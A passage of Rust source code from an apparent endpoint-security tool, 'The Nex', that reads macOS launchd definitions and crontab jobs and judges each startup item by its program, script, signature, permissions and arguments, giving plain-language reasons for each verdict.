/// full one on this computer is not even looked up.
fn resolve(text: &str, what: &str) -> Result<PathBuf, Trouble> {
    let trouble = |exists, look, why: String| Err(Trouble { exists, look, why });
    let shown = clean(text, 120);
    if !full_path(text, cfg!(windows)) {
        return trouble(None, false, format!("The {what} is not given by a full path on this computer ({shown}), so it was not opened or checked."));
    }
    let path = match fs::canonicalize(text) {
        Ok(path) => path,
        Err(e)
            if matches!(
                e.kind(),
                std::io::ErrorKind::NotFound | std::io::ErrorKind::NotADirectory
            ) =>
        {
            return trouble(Some(false), true, format!("The {what} is not there ({shown}). This usually means the software was removed and left this entry behind."));
        }
        Err(_) => {
            return trouble(None, false, format!("The {what} could not be looked at ({shown}), so it was not checked. You may not have permission."));
        }
    };
    if path.to_string_lossy().starts_with(r"\\?\UNC\") {
        return trouble(
            None,
            false,
            format!(
                "The {what} is on another computer ({shown}), so it was not opened or checked."
            ),
        );
    }
    match fs::metadata(&path) {
        Ok(meta) if meta.is_file() => Ok(path),
        Ok(_) => trouble(Some(true), true, format!("The {what} is not an ordinary file (it is a folder, pipe or device: {shown}), so it was not checked.")),
        Err(_) => trouble(None, false, format!("The {what} could not be looked at ({shown}), so it was not checked.")),
    }
}

/// The interpreter and its one option from a script's first line. None when it has none.
fn shebang(path: &Path) -> Option<(String, Vec<String>)> {
    use std::io::Read;
    let mut head = Vec::new();
    crate::quarantine::open_nofollow(path)
        .ok()?
        .take(512)
        .read_to_end(&mut head)
        .ok()?;
    let line = head.strip_prefix(b"#!")?.split(|b| *b == b'\n').next()?;
    let line = String::from_utf8_lossy(line).trim().to_string();
    let (program, option) = line.split_once([' ', '\t']).unwrap_or((&line, ""));
    let option = option.trim();
    Some((
        program.to_string(),
        (!option.is_empty())
            .then(|| option.to_string())
            .into_iter()
            .collect(),
    ))
}

/// A part of an argument that is a full path: `/x`, `--file=/x`, `C:\x.dll,Entry`.
pub fn path_in(arg: &str, windows: bool) -> Option<&str> {
    if !windows {
        return arg.find('/').map(|at| &arg[at..]);
    }
    arg.match_indices(':').find_map(|(at, _)| {
        let path = arg.get(at.checked_sub(1)?..)?.split(',').next()?;
        full_path(path, true).then_some(path)
    })
}

/// Whether a file is a script or a library: something another program would run.
fn is_code_file(path: &Path) -> bool {
    const CODE: &[&str] = &[
        "sh",
        "command",
        "py",
        "pyc",
        "rb",
        "pl",
        "js",
        "mjs",
        "cjs",
        "php",
        "lua",
        "scpt",
        "applescript",
        "jar",
        "asar",
        "dylib",
        "so",
        "dll",
        "ps1",
        "vbs",
        "bat",
        "cmd",
        "hta",
    ];
    path.extension()
        .is_some_and(|e| CODE.contains(&e.to_string_lossy().to_ascii_lowercase().as_str()))
        || shebang(path).is_some()
}

/// Whether a file is something to run, whatever it is called.
fn is_runnable(path: &Path) -> bool {
    is_code_file(path) || engine::classify_file(path) == FileKind::Binary || may_execute(path)
}

#[cfg(unix)]
fn may_execute(path: &Path) -> bool {
    fs::metadata(path).is_ok_and(|m| std::os::unix::fs::MetadataExt::mode(&m) & 0o111 != 0)
}

#[cfg(not(unix))]
fn may_execute(_path: &Path) -> bool {
    false
}

#[derive(Debug, Default)]
struct Findings {
    /// Makes it "Suspicious".
    strong: Vec<String>,
    /// "Worth a look".
    soft: Vec<String>,
    /// At best "Not checked".
    unsure: Vec<String>,
    /// Said, but changes nothing.
    info: Vec<String>,
}

impl Findings {
    fn verdict(&self, inspected: bool) -> Verdict {
        if !self.strong.is_empty() {
            Verdict::Suspicious
        } else if !self.soft.is_empty() {
            Verdict::WorthALook
        } else if inspected && self.unsure.is_empty() {
            Verdict::NothingFound
        } else {
            Verdict::NotChecked
        }
    }

    fn reasons(self) -> Vec<String> {
        [self.strong, self.soft, self.unsure, self.info].concat()
    }
}

const NEVER_SCANNED: &str =
    "It is in a place you told The Nex never to scan, so it was not opened or checked.";

/// What the check of one file found.
struct Looked {
    /// A real result for a program: a trusted signature or a clean score.
    clean: bool,
    /// The owner's always-allow.
    allowed: bool,
    score: Option<f32>,
}

/// `script`: an interpreter is given the file, so whether it would be a good program says nothing.
fn look_at(
    cfg: &AppConfig,
    scanner: &BinaryAiScanner,
    file: &Path,
    script: bool,
    f: &mut Findings,
) -> Looked {
    if cfg.is_skipped(file) {
        f.unsure.push(NEVER_SCANNED.into());
        return Looked {
            clean: false,
            allowed: false,
            score: None,
        };
    }
    let r = check_file::check(cfg, scanner, file);
    let allowed = r
        .sha256
        .as_deref()
        .and_then(digest_of)
        .is_some_and(|d| cfg.is_allowed(&d));
    // An archive's structure is not a real result.
    let clean = !script
        && r.verdict == FileVerdict::NothingFound
        && r.checks.iter().any(|c| c == "signature" || c == "program");
    match r.verdict {
        FileVerdict::Suspicious if !allowed => f.strong.extend(r.reasons),
        _ if allowed => f.info.push(
            "You told The Nex to always allow this exact file, so it is not flagged.".into(),
        ),
        FileVerdict::Refused => f.info.extend(
            r.reasons
                .iter()
                .map(|why| format!("It was not checked: {why}")),
        ),
        _ if clean => {}
        _ if !script && engine::classify_file(file) == FileKind::Binary => f.info.push(
            "It is a program, but it is too large or too damaged to be scored, so it was not checked."
                .into(),
        ),
        _ => f.info.push(
            "It runs a script or another file that cannot be scored, so what that does was not checked."
                .into(),
        ),
    }
    Looked {
        clean,
        allowed,
        score: r.score,
    }
}

/// Whether an allowed program is what runs: the system hands a script to the program its first
/// line names, so that has to be an understood one this computer trusts.
fn runs_itself(cfg: &AppConfig, scanner: &BinaryAiScanner, file: &Path) -> bool {
    shebang(file).is_none_or(|(program, mut args)| {
        args.push(file.to_string_lossy().into_owned());
        resolve(&program, "").is_ok_and(|p| {
            !cfg.is_skipped(&p)
                && scanner.is_trusted(&p)
                && script_of(&program_stem(&p.to_string_lossy()), &args).is_some()
        })
    })
}

/// Who can change a file this item runs, and whether it is somewhere programs do not live.
fn look_around(text: &str, path: &Path, what: &str, as_root: bool, f: &mut Findings) {
    let folder = path.to_string_lossy();
    if let Some(place) = risky_location(&folder).or_else(|| risky_location(text)) {
        f.soft.push(location_reason(
            place,
            if what == "script" {
                "a script"
            } else {
                "a program"
            },
        ));
    }
    if others_can_change(path) || others_can_change(Path::new(text)) {
        f.soft.push(format!(
            "Other users on this computer can change the {what} it runs, or a folder it is in."
        ));
    }
    if as_root && (ordinary_owner(path) || ordinary_owner(Path::new(text))) {
        f.soft.push(format!("It runs with full system rights, but an ordinary account owns the {what} it runs or a folder it is in, and could replace it."));
    }
}

fn check_command(names: &[String], command_line: &str, f: &mut Findings) {
    let Some(pattern) = names
        .iter()
        .find_map(|name| process_guard::check_lotl_command(name, command_line))
    else {
        return;
    };
    // Something that starts by itself is not a command a person just ran: one sign is enough.
    if process_guard::is_alert_only(pattern) && pattern != process_guard::ONE_WEAK_SIGN {
        f.soft.push(format!(
            "The command it runs is one that malware uses, but many installers do too (matched \"{pattern}\")."
        ));
    } else {
        f.strong.push(format!(
            "The command it runs looks like one malware uses to hide or fetch things (matched \"{pattern}\")."
        ));
    }
}

/// Whether a program by one of these names runs what it is given.
fn runs_others(names: [&str; 2], os_tool: bool) -> bool {
    names.iter().any(|s| {
        is_interpreter(s) || named_in(LAUNCHERS, s) || (os_tool && named_in(OS_LAUNCHERS, s))
    })
}

/// The command-line rules for `program`, which is really called `stem`. `shell`: whatever it
/// starts in turn may be a shell.
fn check_program_command(c: &Candidate, program: &str, stem: &str, shell: bool, f: &mut Findings) {
    let given = program_stem(program);
    let mut names: Vec<String> = [stem, base_name(stem), &given, base_name(&given)]
        .iter()
        .flat_map(|n| [n.to_string(), format!("{n}.exe")])
        .collect();
    if shell || c.shell_command.is_some() {
        names.push(if cfg!(windows) { "cmd.exe" } else { "sh" }.into());
    }
    let mut line = program.to_string();
    for arg in &c.arguments {
        line.push(' ');
        line.push_str(arg);
    }
    check_command(&names, c.shell_command.as_ref().unwrap_or(&line), f);
}

/// What a definition's text alone says. Nothing is opened.
fn quick_look(c: &Candidate) -> Findings {
    let mut f = Findings {
        soft: c.notes.clone(),
        unsure: c.doubts.clone(),
        ..Findings::default()
    };
    if let Some(program) = c.program.as_deref() {
        let stem = program_stem(program);
        let os_tool =
            !full_path(program, cfg!(windows)) || ai_policy::is_os_folder(Path::new(program));
        let shell =
            script_of(&stem, &c.arguments).is_none() && runs_others([&stem, &stem], os_tool);
        check_program_command(c, program, &stem, shell, &mut f);
    } else if let Some(command) = &c.shell_command {
        check_command(&["sh".to_string()], command, &mut f);
    }
    f
}

/// At most this many possible file names in one item's arguments are looked up; arguments beyond
/// that are still not harmless.
const MAX_LOOKUPS: usize = 2000;

/// What the arguments could make a program do. `os_tool`: the program is part of the system,
/// which other programs use to run things.
fn check_arguments(
    cfg: &AppConfig,
    args: &[String],
    stem: &str,
    os_tool: bool,
    folders: &[&Path],
    f: &mut Findings,
) {
    let windows = cfg!(windows);
    let files = |name: &str| -> Vec<PathBuf> {
        if full_path(name, windows) {
            return fs::canonicalize(name).into_iter().collect();
        }
        let in_folder = |folder: &&Path| fs::canonicalize(folder.join(name)).ok();
        folders.iter().filter_map(in_folder).collect()
    };
    let says_plugin = |arg: &str| {
        let arg = arg.to_ascii_lowercase();
        arg.contains("extension") || arg.contains("plugin")
    };
    let named = args
        .iter()
        .enumerate()
        .filter(|(_, arg)| !is_bare_switch(arg))
        .flat_map(|(i, arg)| paths_in(arg, windows).into_iter().map(move |p| (i, p)));
    let found = named.take(MAX_LOOKUPS).find_map(|(i, name)| {
        let what = files(name).iter().find_map(|file| {
            let plugin = says_plugin(&args[i]) || (i > 0 && says_plugin(&args[i - 1]));
            if file.is_dir() {
                (os_tool || plugin).then_some(if plugin {
                    "a folder of extensions or plugins"
                } else {
                    "a folder"
                })
            } else {
                // What is in a never-scan place is not opened; taken to be one, so it is said.
                let runnable = || cfg.is_skipped(file) || is_runnable(file);
                (os_tool || (file.is_file() && runnable())).then_some("a file")
            }
        })?;
        Some((what, name))
    });
    if let Some((what, name)) = found {
        f.soft.push(format!(
            "It gives the program {what} ({}). What that makes it do was not checked.",
            clean(name, 120)
        ));
    } else if os_tool && !args.is_empty() && !PLAIN_OS_TOOLS.contains(&stem) {
        f.unsure.push(
            "It starts a system tool with instructions. What those make it do was not checked."
                .into(),
        );
    } else if !os_tool {
        let is_file = |name: &str| files(name).iter().any(|p| p.is_file());
        if let Some(arg) = args.iter().find(|a| !harmless_argument(a, &is_file)) {
            f.unsure.push(format!(
                "It gives the program instructions ({}). What those make it do was not checked.",
                clean(arg, 120)
            ));
        }
    }
}

/// Judges what `program` and its arguments really run; true when that was inspected.
fn judge_program(
    cfg: &AppConfig,
    scanner: &BinaryAiScanner,
    c: &Candidate,
    program: &str,
    item: &mut StartupItem,
    f: &mut Findings,
) -> bool {
    let resolved = resolve(program, "program it starts");
    let given = program_stem(program);
    let stem = resolved
        .as_ref()
        .map_or_else(|_| given.clone(), |p| program_stem(&p.to_string_lossy()));
    let args = c.arguments.as_slice();
    let os_file = resolved.as_ref().is_ok_and(|p| ai_policy::is_os_folder(p));
    let os_tool = os_file
        || resolved
            .as_ref()
            .is_ok_and(|p| ai_policy::is_windows_folder_file(p));
    let os_copy = !os_tool
        && resolved
            .as_ref()
            .is_ok_and(|p| !cfg.is_skipped(p) && platform::is_os_vendor_signed(p));
    let script = script_of(&stem, args).map(str::to_string);
    let indirect = script.is_none() && runs_others([&stem, &given], os_tool || resolved.is_err());
    check_program_command(c, program, &stem, indirect || os_copy, f);

    if indirect {
        f.soft.push(format!("It starts {}, which runs what it is given in a way this check does not follow. What really runs was not checked.", clean(&stem, 60)));
    } else if os_copy {
        f.soft.push("It starts a copy of a system tool kept outside the system folders. What it does there was not checked.".into());
    }
    let path = match resolved {
        Ok(path) => path,
        Err(trouble) => {
            item.exists = trouble.exists;
            if trouble.look {
                &mut f.soft
            } else {
                &mut f.info
            }
            .push(trouble.why);
            item.script = script;
            return false;
        }
    };
    item.exists = Some(true);
    if cfg.is_skipped(&path) {
        look_around(program, &path, "program", c.as_root, f);
        f.unsure.push(NEVER_SCANNED.into());
        // The script it is given may be elsewhere.
        if let Some(Ok(file)) = script.as_deref().map(|s| resolve(s, "script it runs")) {
            item.allowed = look_at(cfg, scanner, &file, true, f).allowed;
        }
        item.script = script;
        return false;
    }
    item.trusted = scanner.is_trusted(&path);
    let engine = crate::config::default_base_dir()
        .join("engine")
        .join(platform::DAEMON_EXE_STEM);
    let own = is_own_service(
        &c.name,
        c.kind,
        program,
        args,
        &engine,
        root_owned_closed(Path::new(program), false),
        Path::new(program)
            .parent()
            .is_some_and(|dir| root_owned_closed(dir, true)),
    );
    if own {
        f.info
            .push("This is The Nex's own background service.".into());
    }
    if let Some(vendor) = claimed_vendor(&c.name) {
        // What is inside the system's own folders needs no signature check.
        let signed = match os_file && cfg!(target_os = "macos") {
            true => Some(vendor == "Apple"),
            false => platform::is_signed_by(&path, vendor),
        };
        match check_claim(vendor, os_file, signed, item.trusted) {
            Claim::Confirmed if script.is_some() || indirect => f.soft.push(format!(
                "Its name says it comes from {vendor}, but it runs something that {vendor} did not sign."
            )),
            Claim::Confirmed => {}
            Claim::Unknown => f.soft.push(format!(
                "Its name says it comes from {vendor}. The program is signed, but this version cannot tell by whom."
            )),
            // Another maker's program may carry Microsoft's name; only Apple's may carry Apple's.
            Claim::Contradicted if vendor != "Apple" && item.trusted => f.soft.push(format!(
                "Its name mentions {vendor}, but the program is signed by someone else."
            )),
            // Only a label no one else has a reason to use is proof; plenty of unsigned helpers
            // mention what they work with.
            Claim::Contradicted if exact_vendor_label(&c.name) => f.strong.push(format!(
                "Its name says it comes from {vendor}, but the program is not signed by {vendor}."
            )),
            Claim::Contradicted => f.soft.push(format!(
                "Its name mentions {vendor}, but the program is not signed by {vendor}."
            )),
        }
    }
    let shown = path.to_string_lossy();
    let shown = shown.strip_prefix(r"\\?\").unwrap_or(&shown);
    if !shown.eq_ignore_ascii_case(program) && shown.strip_prefix("/private") != Some(program) {
        f.info.push(format!(
            "That path leads to another file, and that one was checked: {}",
            clean(shown, 200)
        ));
    }
    look_around(program, &path, "program", c.as_root, f);
    if !runs_by_itself(&path.to_string_lossy(), cfg!(windows)) {
        f.unsure.push(
            "Windows opens this kind of file with another program, and which one was not checked."
                .into(),
        );
    }

    let looked = look_at(cfg, scanner, &path, false, f);
    item.score = looked.score;
    item.allowed = looked.allowed;
    let mut inspected = looked.clean;
    if looked.allowed && !inspected {
        inspected = runs_itself(cfg, scanner, &path);
        if !inspected {
            f.info
                .push("Its first line hands it to another program, which was not checked.".into());
        }
    }
    if !own && !item.trusted && engine::classify_file(&path) == FileKind::Binary {
        f.soft.push("It is not signed by a publisher this computer trusts, so its maker cannot be confirmed.".into());
    }
    if !indirect && !os_copy {
        let rest = script
            .as_ref()
            .and_then(|s| args.iter().position(|a| a == s))
            .map_or(args, |at| &args[at + 1..]);
        // What follows a script is for the script.
        let os_tool = os_tool && script.is_none();
        let folders: Vec<&Path> = [path.parent(), c.folder.as_deref()]
            .into_iter()
            .flatten()
            .filter(|_| !os_tool)
            .collect();
        check_arguments(cfg, rest, &stem, os_tool, &folders, f);
    }
    if let Some(script) = script {
        if item.trusted {
            f.info.push(format!(
                "It runs a script with {}, a tool this computer trusts. That does not make the script trusted.",
                clean(&stem, 60)
            ));
        }
        let script_inspected = match resolve(&script, "script it runs") {
            Ok(file) => {
                look_around(&script, &file, "script", c.as_root, f);
                item.allowed = look_at(cfg, scanner, &file, true, f).allowed;
                item.allowed
            }
            Err(trouble) => {
                if trouble.look {
                    &mut f.soft
                } else {
                    &mut f.info
                }
                .push(trouble.why);
                false
            }
        };
        item.script = Some(script);
        return inspected && script_inspected;
    }
    inspected && !indirect && !os_copy
}

fn judge(cfg: &AppConfig, scanner: &BinaryAiScanner, c: Candidate) -> StartupItem {
    let Some(program) = c.program.as_deref() else {
        let f = quick_look(&c);
        return plain_item(&c, f.verdict(false), f.reasons());
    };
    let mut f = Findings {
        soft: c.notes.clone(),
        unsure: c.doubts.clone(),
        ..Findings::default()
    };
    let mut item = plain_item(&c, Verdict::NotChecked, Vec::new());
    let inspected = judge_program(cfg, scanner, &c, program, &mut item, &mut f);
    item.verdict = f.verdict(inspected);
    item.reasons = f.reasons();
    item
}

/// An item there was no time to judge: what its text alone says still counts.
fn unjudged(c: &Candidate, why: &str) -> StartupItem {
    let mut f = quick_look(c);
    f.unsure.insert(0, why.into());
    plain_item(c, f.verdict(false), f.reasons())
}

/// `judge` on its own thread, abandoned if it takes too long (a signature check or a hash of a
/// huge file can stall); the abandoned thread only reads and ends with the process.
fn judge_timed(
    cfg: &Arc<AppConfig>,
    scanner: &Arc<BinaryAiScanner>,
    c: &Candidate,
    limit: Duration,
) -> StartupItem {
    let (sender, receiver) = mpsc::channel();
    let (cfg, scanner, owned) = (Arc::clone(cfg), Arc::clone(scanner), c.clone());
    let spawned = std::thread::Builder::new()
        .name("thenex-startup-item".into())
        .spawn(move || {
            let _ = sender.send(judge(&cfg, &scanner, owned));
        });
    let outcome = match spawned {
        Ok(_) => receiver.recv_timeout(limit).ok(),
        Err(_) => None,
    };
    outcome.unwrap_or_else(|| {
        unjudged(
            c,
            "Checking this one took too long, so it was stopped. Nothing was changed.",
        )
    })
}

#[derive(Debug, Clone, Copy)]
pub struct Limits {
    pub max_items: usize,
    pub per_item: Duration,
    pub total: Duration,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            max_items: MAX_ITEMS,
            per_item: ITEM_LIMIT,
            total: TOTAL_LIMIT,
        }
    }
}

/// Reads every startup place and judges each item. `startup_dir` (testing only) replaces every
/// place with that one folder.
pub fn list(
    cfg: &Arc<AppConfig>,
    scanner: &Arc<BinaryAiScanner>,
    startup_dir: Option<&Path>,
    limits: Limits,
) -> StartupReport {
    let start = Instant::now();
    let deadline = start + limits.total;
    let mut found = Found {
        candidates: Vec::new(),
        unreadable: Vec::new(),
        truncated: false,
        max_items: limits.max_items,
        deadline: start + limits.total / 2,
        skipped: Arc::clone(&cfg.skipped),
    };
    collect(&mut found, startup_dir);
    found.candidates.sort_by_key(|(rank, _)| *rank);
    let mut report = StartupReport {
        truncated: found.truncated,
        unreadable: found.unreadable,
        ..StartupReport::default()
    };
    for (_, candidate) in &found.candidates {
        report.items.push(if Instant::now() >= deadline {
            unjudged(candidate, NO_TIME)
        } else {
            judge_timed(
                cfg,
                scanner,
                candidate,
                limits.per_item.min(deadline - Instant::now()),
            )
        });
    }
    report.truncated |= Instant::now() >= deadline;
    report
        .items
        .sort_by_cached_key(|i| (i.verdict.rank(), i.name.to_lowercase()));
    report.clamp();
    report
}

// ---- macOS: launchd and cron ----

#[cfg(target_os = "macos")]
use self::launchd::collect;

#[cfg(target_os = "macos")]
mod launchd {
    use super::*;
    use std::io::Read;
    use std::process::{Command, Stdio};

    const PLUTIL: &str = "/usr/bin/plutil";
    const CRONTAB: &str = "/usr/bin/crontab";
    const TOOL_LIMIT: Duration = Duration::from_secs(5);
    const MAX_TOOL_OUTPUT: u64 = 2 * 1024 * 1024;
    /// Where launchd looks for a program given without a folder.
    const DEFAULT_PATH: [&str; 4] = ["/usr/bin", "/bin", "/usr/sbin", "/sbin"];

    fn note_environment(c: &mut Candidate, variable: &str) {
        let shown = clean(variable, 60);
        if loads_other_code(variable) {
            c.notes.push(format!(
                "It sets {shown}, which can make the program load other code first. That code was not checked."
            ));
        } else if !harmless_variable(variable) {
            c.doubts.push(format!(
                "It sets {shown}. What that changes about the program was not checked."
            ));
        }
    }

    /// A definition that could not be read is an item too: `look` when that is itself odd.
    fn push_unread(found: &mut Found, path: &Path, kind: &'static str, look: bool, why: String) {
        let mut c = candidate(&[], path, kind, false);
        c.doubts.clear(); // it names no program because it was not read
        if look { &mut c.notes } else { &mut c.doubts }.push(why);
        found.push(c);
    }

    /// What a system tool answered: success, its output and its error text.
    pub(super) struct Answer {
        pub(super) ok: bool,
        pub(super) out: Vec<u8>,
        pub(super) err: String,
    }

    /// Runs a system tool with no shell, bytes on stdin, a time limit and bounded output.
    /// None when it could not be started or ran too long.
    pub(super) fn run_limited(program: &str, args: &[&str], input: &[u8]) -> Option<Answer> {
        let mut child = Command::new(program)
            .args(args)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .ok()?;
        let mut stdin = child.stdin.take()?;
        let stdout = child.stdout.take()?;
        let stderr = child.stderr.take()?;
        let data = input.to_vec();
        std::thread::spawn(move || {
            let _ = std::io::Write::write_all(&mut stdin, &data);
        });
        let (sender, receiver) = mpsc::channel();
        std::thread::spawn(move || {
            let mut out = Vec::new();
            let _ = stdout.take(MAX_TOOL_OUTPUT).read_to_end(&mut out);
            let mut err = Vec::new();
            let _ = stderr.take(4096).read_to_end(&mut err);
            let _ = sender.send((out, String::from_utf8_lossy(&err).into_owned()));
        });
        let deadline = Instant::now() + TOOL_LIMIT;
        let ok = loop {
            match child.try_wait() {
                Ok(Some(status)) => break Some(status.success()),
                Ok(None) if Instant::now() < deadline => {
                    std::thread::sleep(Duration::from_millis(5))
                }
                _ => break None,
            }
        };
        if ok.is_none() {
            let _ = child.kill();
            let _ = child.wait();
        }
        let (out, err) = receiver.recv_timeout(Duration::from_secs(2)).ok()?;
        ok.map(|ok| Answer { ok, out, err })
    }

    /// Why a definition could not be read, and whether that is worth a look by itself.
    pub(super) type Unread = (bool, String);

    /// The bytes of a definition and whether other users can change it. Links are followed once
    /// to a real file and nothing else is opened: no pipe, device or folder, and no waiting.
    fn read_definition(skipped: &LiveSkipped, path: &Path) -> Result<(Vec<u8>, bool), Unread> {
        let too_big = || {
            (
                true,
                "It is far larger than any real startup file, so it was not opened and what it starts is not known.".to_string(),
            )
        };
        let target = fs::canonicalize(path).map_err(|e| {
            let why = if e.kind() == std::io::ErrorKind::PermissionDenied {
                "It could not be opened. You may not have permission."
            } else {
                "It is a link that leads nowhere, so it was not opened."
            };
            (false, why.to_string())
        })?;
        if skipped.covers(&target) {
            return Err((false, NEVER_SCANNED.to_string()));
        }
        let file = crate::quarantine::open_nofollow(&target).map_err(|e| {
            if e.kind() == std::io::ErrorKind::InvalidInput {
                (true, "It is not an ordinary file (it is a folder, pipe or device), so it was not opened.".to_string())
            } else {
                (false, "It could not be opened. You may not have permission.".to_string())
            }
        })?;
        let unreadable = || (false, "It could not be read.".to_string());
        let meta = file.metadata().map_err(|_| unreadable())?;
        if meta.len() > MAX_DEFINITION_BYTES {
            return Err(too_big());
        }
        let mut bytes = Vec::new();
        file.take(MAX_DEFINITION_BYTES + 1)
            .read_to_end(&mut bytes)
            .map_err(|_| unreadable())?;
        if bytes.len() as u64 > MAX_DEFINITION_BYTES {
            return Err(too_big());
        }
        Ok((bytes, others_can_change(path) || others_can_change(&target)))
    }

    pub(super) fn settings(answer: Option<Answer>) -> Result<Vec<(String, Setting)>, Unread> {
        let Some(answer) = answer else {
            return Err((
                true,
                "It could not be read: the system's property-list reader did not answer."
                    .to_string(),
            ));
        };
        std::str::from_utf8(&answer.out)
            .ok()
            .filter(|_| answer.ok)
            .and_then(read_plist_xml)
            .ok_or_else(|| {
                (
                    true,
                    "It is damaged or written in a way this check cannot read, so what it starts is not known."
                        .to_string(),
                )
            })
    }

    /// What launchd is told to start by the definition in `bytes`.
    fn definition(
        bytes: &[u8],
        path: &Path,
        kind: &'static str,
        loose: bool,
    ) -> Result<Candidate, Unread> {
        let answer = run_limited(PLUTIL, &["-convert", "xml1", "-o", "-", "-"], bytes);
        let mut c = candidate(&settings(answer)?, path, kind, loose);
        c.doubts.extend(definition_doubt(bytes).map(String::from));
        Ok(c)
    }

    pub(super) fn candidate(
        settings: &[(String, Setting)],
        path: &Path,
        kind: &'static str,
        loose: bool,
    ) -> Candidate {
        let get = |key: &str| settings.iter().find(|(k, _)| k == key).map(|(_, v)| v);
        let text = |key: &str| match get(key) {
            Some(Setting::Text(text)) => Some(text.clone()),
            _ => None,
        };
        let mut c = Candidate {
            name: text("Label")
                .or_else(|| path.file_stem().map(|s| s.to_string_lossy().into_owned()))
                .unwrap_or_default(),
            kind,
            location: path.display().to_string(),
            runs_as: "you".into(),
            folder: Some(
                text("WorkingDirectory")
                    .unwrap_or_else(|| "/".into())
                    .into(),
            ),
            ..Candidate::default()
        };
        if kind == "launch_daemon" {
            match text("UserName").as_deref() {
                None | Some("root") | Some("") => {
                    c.runs_as = "system".into();
                    c.as_root = true;
                }
                // In quotes, so an account called "you" or "system" is not mistaken for those.
                Some(user) => c.runs_as = format!("account \"{user}\""),
            }
        }
        let mut argv = Vec::new();
        if let Some(Setting::List(list)) = get("ProgramArguments") {
            if list.contains(&None) {
                c.notes.push("Its list of arguments holds something other than text, so what it starts is not certain.".into());
            }
            argv.extend(list.iter().flatten().cloned());
        }
        let variables = match get("EnvironmentVariables") {
            Some(Setting::Keys(keys)) => keys.as_slice(),
            _ => &[],
        };
        for variable in variables {
            note_environment(&mut c, variable);
        }
        for (key, why) in [
            ("RootDirectory", "It runs inside another root folder, so the program checked here may not be the one that runs."),
            ("EnableGlobbing", "Its arguments are patterns that are filled in when it starts, so what it runs is not certain."),
            ("StandardInPath", "It feeds a file to the program, and that file was not checked."),
            ("inetdCompatibility", "It hands network connections to the program it starts."),
        ] {
            if !matches!(get(key), None | Some(Setting::Flag(false))) {
                c.notes.push(why.into());
            }
        }
        let named = text("Program");
        let first = (!argv.is_empty()).then(|| argv.remove(0));
        // launchd searches a fixed PATH for a bare first argument, but not for `Program`.
        let search = named.is_none() && !variables.iter().any(|v| v == "PATH");
        c.program = named.or(first).map(|p| {
            if !search || p.contains('/') {
                return p;
            }
            DEFAULT_PATH
                .iter()
                .map(|dir| format!("{dir}/{p}"))
                .find(|full| Path::new(full).exists())
                .unwrap_or(p)
        });
        c.arguments = argv;
        if c.program.is_none() {
            c.doubts.push(match text("BundleProgram") {
                Some(inside) => format!(
                    "It starts a program inside an app (\"{}\"), and which app that is was not found, so the program was not checked.",
                    clean(&inside, 100)
                ),
                None => "It does not name a program to start, so there is nothing to check.".into(),
            });
        }
        c.enabled = if get("Disabled") == Some(&Setting::Flag(true)) {
            Some(false)
        } else if get("RunAtLoad") == Some(&Setting::Flag(true))
            || matches!(
                get("KeepAlive"),
                Some(Setting::Flag(true) | Setting::Keys(_))
            )
        {
            Some(true)
        } else {
            None
        };
        if loose {
            c.notes.push(
                "Other users on this computer can change this startup file, or a folder it is in."
                    .into(),
            );
        }
        c
    }

    fn scan_dir(found: &mut Found, dir: &Path, kind: &'static str) {
        let entries = match fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
            Err(_) => {
                found.unreadable(
                    dir.display().to_string(),
                    "This folder could not be opened. You may not have permission.",
                );
                return;
            }
        };
        let mut files: Vec<PathBuf> = Vec::new();
        for entry in entries {
            let Ok(path) = entry.map(|e| e.path()) else {
                found.truncated = true;
                continue;
            };
            let plist = path
                .extension()
                .is_some_and(|e| e.eq_ignore_ascii_case("plist"));
            if plist && files.len() < MAX_DIR_ENTRIES {
                files.push(path);
            } else if plist {
                found.truncated = true;
                break;
            }
        }
        files.sort();
        for path in files {
            if found.late() {
                found.truncated = true;
                push_unread(found, &path, kind, false, NO_TIME.into());
                continue;
            }
            let read = read_definition(&found.skipped, &path)
                .and_then(|(bytes, loose)| definition(&bytes, &path, kind, loose));
            match read {
                Ok(c) => found.push(c),
                Err((look, why)) => push_unread(found, &path, kind, look, why),
            }
        }
    }

    /// The jobs of one crontab. Cron hands every line to a shell, so only a plain command is
    /// judged as the program it names.
    pub(super) fn cron_candidates(text: &str) -> Vec<Candidate> {
        let tab = parse_crontab(text);
        let mut common = Candidate::default();
        for (name, value) in &tab.settings {
            match (name.as_str(), value.as_str()) {
                // Not zsh: it runs a file of its own (.zshenv) before every command.
                ("SHELL", "/bin/sh" | "/bin/bash") | ("MAILTO", _) => {}
                ("SHELL", shell) => common.notes.push(format!(
                    "The crontab has its jobs run by another program ({}), which was not checked.",
                    clean(shell, 100)
                )),
                _ => note_environment(&mut common, name),
            }
        }
        // Every job carries these.
        common.notes.truncate(MAX_REASONS);
        common.doubts.truncate(MAX_REASONS);
        let home = std::env::var_os("HOME").map(PathBuf::from);
        tab.jobs
            .into_iter()
            .map(|(schedule, command)| {
                let mut words = command.split_whitespace().map(str::to_string);
                let first = words.next().unwrap_or_default();
                let mut c = Candidate {
                    name: program_stem(&first),
                    kind: "cron",
                    location: format!("Your scheduled jobs (crontab), {schedule}"),
                    arguments: words.collect(),
                    enabled: Some(true),
                    runs_as: "you".into(),
                    folder: home.clone(),
                    ..common.clone()
                };
                if is_plain_command(&command) {
                    c.program = Some(first);
                } else {
                    c.notes.push(
                        "It runs a shell command, so what really starts was not checked.".into(),
                    );
                }
                c.shell_command = Some(command);
                c
            })
            .collect()
    }

    fn scan_cron(found: &mut Found) {
        add_cron(found, run_limited(CRONTAB, &["-l"], b""));
    }

    pub(super) fn add_cron(found: &mut Found, answer: Option<Answer>) {
        const PLACE: &str = "Your scheduled jobs (crontab)";
        match answer {
            Some(a) if a.ok => {
                found.truncated |= a.out.len() as u64 >= MAX_TOOL_OUTPUT;
                for c in cron_candidates(&String::from_utf8_lossy(&a.out)) {
                    found.push(c);
                }
            }
            // The normal answer for someone who has none.
            Some(a) if a.err.contains("no crontab for") => {}
            _ => found.unreadable(PLACE, "They could not be listed."),
        }
    }

    pub(super) fn collect(found: &mut Found, startup_dir: Option<&Path>) {
        if let Some(dir) = startup_dir {
            return scan_dir(found, dir, "launch_agent");
        }
        scan_dir(found, Path::new("/Library/LaunchDaemons"), "launch_daemon");
        scan_dir(found, Path::new("/Library/LaunchAgents"), "launch_agent");
        match std::env::var_os("HOME")
            .map(PathBuf::from)
            .filter(|h| h.is_absolute())
        {
